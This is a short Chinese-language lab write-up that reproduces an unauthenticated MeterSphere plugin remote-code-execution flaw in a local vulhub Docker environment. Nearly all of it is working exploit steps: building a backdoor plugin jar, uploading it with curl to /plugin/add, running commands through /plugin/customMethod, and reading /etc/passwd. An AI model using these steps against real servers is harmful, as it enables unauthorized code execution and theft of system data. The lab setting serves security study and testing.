开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:8081
```

先访问页面：
```
http://localhost:8081/plugin/list
```
可以看见返回插件信息，说明`plugin/*`接口存在未授权访问问题，可以利用

利用漏洞前，先下载一个插件：
```
git clone https://github.com/vulhub/metersphere-plugin-Backdoor.git
```

下完后由于电脑的java版本过高，和原插件不匹配
所以使用`maven`构建：
```
docker run --rm \ -v /Users/vanadium/Desktop/vulhub/vulhub/metersphere/plugin-rce/metersphere-plugin-Backdoor:/app \ -w /app \ maven:3-jdk-8 \ mvn -q -B clean package -DskipTests
```
-v后面必须跟绝对路径

结束后会在文件夹内出现一个target文件夹
文件夹内就是二进制jar

使用curl发送：
```
curl -s --noproxy '*' -i -X POST http://127.0.0.1:8081/plugin/add \ -F "file=@metersphere-plugin-Backdoor-1.1.0-SNAPSHOT.jar;filename=Evil.jar"
```
会报错，但是恶意JAR包已经添加进系统ClassLoader中

然后发送数据包执行`org.vulhub.Evil`类中的恶意代码
```
curl -s --noproxy '*' -X POST http://127.0.0.1:8081/plugin/customMethod \ -H 'Content-Type: application/json' \ -d '{"entry":"org.vulhub.Evil","request":"id"}'
```
然后就会返回id

可以把id换成其他命令，如：cat /etc/passwd等
